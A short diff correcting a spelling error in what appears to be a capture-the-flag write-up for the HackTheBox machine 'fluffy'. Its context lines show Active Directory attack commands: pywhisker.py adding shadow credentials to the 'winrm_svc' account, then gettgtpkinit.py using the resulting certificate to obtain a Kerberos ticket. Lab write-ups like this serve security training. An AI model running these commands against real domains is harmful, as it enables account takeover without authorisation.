@@ -13,7 +13,7 @@ pywhisker.py -d "<DOMAIN" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --act
 ```
 
 
-then we need to get TGT with the outputed certs:
+then we need to get TGT with the outputted certs:
 ```bash
 gettgtpkinit.py -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
 
